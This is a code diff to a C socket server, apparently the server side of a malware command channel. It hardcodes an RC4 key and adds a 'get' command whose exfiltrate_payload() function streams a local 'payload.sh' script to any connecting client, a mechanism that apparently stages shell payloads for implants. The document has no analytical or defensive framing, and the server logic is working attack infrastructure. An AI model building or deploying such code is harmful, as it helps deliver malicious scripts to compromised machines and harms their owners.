@@ -8,13 +8,16 @@
 #include <netdb.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <fcntl.h>
 #include "rc4.h"
 
+void exfiltrate_payload(int afd);
+
+char *key = "LECNAAEAAE";
 int main(int argc, char **argv){
     int status;
     struct addrinfo hints;
     struct addrinfo *servinfo;
-    char *key = "LECNAAEAAE";
 
     memset(&hints, 0, sizeof(hints));
     hints.ai_family   = AF_INET;
@@ -64,21 +67,49 @@ int main(int argc, char **argv){
     socklen_t addrSize = sizeof their_addr;
     while ((afd = accept(soc, (struct sockaddr *)&their_addr, &addrSize)) != -1){
         while (1){
+            memset(BUF, 0, 1024);
             i = recv(afd, BUF, 1024, 0);
-            rc4((unsigned char *)key, strlen(key), BUF, strlen(BUF));
+            // rc4((unsigned char *)key, strlen(key), BUF, strlen(BUF));
             if (i == -1 || i == 0)
                 continue;
             puts(BUF); 
             // printf("%d\n",i);
             if (strcmp("quit", BUF) == 0){
-                send(afd, "aa", 2, 0);
+                send(afd, "aa\0", 3, 0);
                 close(afd);
                 break;
             }
+            else if (strcmp("get", BUF) == 0){
+                send(afd, "bb\0", 3, 0);
+                exfiltrate_payload(afd);
+                break;
+            }
+
             send(afd, "a", 1, 0);
-            memset(BUF, 0, 1024);
         }
     }
     
     return 0;
+}
+
+void exfiltrate_payload(int afd){
+    int pldfd = open("payload.sh", O_RDONLY);
+    if (pldfd == -1) {
+        perror("Failed to open payload file");
+        exit(1);
+    }
+
+    char BUF[1024];
+    memset(BUF, 0, 1024);
+    ssize_t readn, sendn;
+    while ((readn = read(pldfd, BUF, 1024)) != 0){
+        sendn = send(afd, BUF, readn, 0);
+        memset(BUF, 0, 1024);
+        if (sendn == -1){
+            perror("Failed to send payload to client");
+            exit(1);
+        }
+    }
+
+    close(pldfd);
 }
